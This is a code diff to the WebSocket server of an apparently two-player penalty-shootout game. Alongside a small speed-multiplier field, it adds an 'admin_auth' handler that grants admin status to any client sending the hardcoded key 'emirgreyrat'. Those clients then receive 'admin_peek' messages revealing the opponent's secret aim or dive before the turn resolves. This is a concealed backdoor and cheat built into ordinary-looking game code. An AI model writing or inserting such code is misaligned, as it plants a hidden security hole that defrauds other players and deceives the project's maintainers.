@@ -65,6 +65,7 @@ function sanitizeShot(msg) {
     shotType: typeof msg.shotType === 'string' ? msg.shotType.slice(0, 20) : 'normal',
     timedQuality: typeof msg.timedQuality === 'string' ? msg.timedQuality.slice(0, 20) : 'good',
     stutter: Boolean(msg.stutter),
+    speedMult: clamp(msg.speedMult, 1, 2.0, 1),
   };
 }
 
@@ -375,6 +376,13 @@ function attachWebSocketServer(httpServer, options = {}) {
     if (!meta) return;
 
     switch (msg.type) {
+      case 'admin_auth': {
+        if (msg.key === 'emirgreyrat') {
+          ws.isAdmin = true;
+        }
+        return;
+      }
+
       case 'ping': {
         sendJson(ws, {
           type: 'pong',
@@ -479,6 +487,16 @@ function attachWebSocketServer(httpServer, options = {}) {
         const keeper = getOpponentSlot(room, meta.side);
         if (keeper) {
           sendJson(keeper.ws, { type: 'opponent_ready', role: 'shooter' });
+          if (keeper.ws && keeper.ws.isAdmin === true) {
+            sendJson(keeper.ws, {
+              type: 'admin_peek',
+              role: 'shooter',
+              aimX: match.shot.aimX,
+              aimY: match.shot.aimY,
+              dir: match.shot.aimX < -0.9 ? 'left' : (match.shot.aimX > 0.9 ? 'right' : 'center'),
+              height: match.shot.aimY > 1.25 ? 'high' : 'low',
+            });
+          }
         }
         if (match.shot && match.dive) {
           executeTurn(room);
@@ -501,6 +519,14 @@ function attachWebSocketServer(httpServer, options = {}) {
         const shooter = getOpponentSlot(room, meta.side);
         if (shooter) {
           sendJson(shooter.ws, { type: 'opponent_ready', role: 'keeper' });
+          if (shooter.ws && shooter.ws.isAdmin === true) {
+            sendJson(shooter.ws, {
+              type: 'admin_peek',
+              role: 'keeper',
+              dir: match.dive.dir,
+              height: match.dive.height,
+            });
+          }
         }
         if (match.shot && match.dive) {
           executeTurn(room);
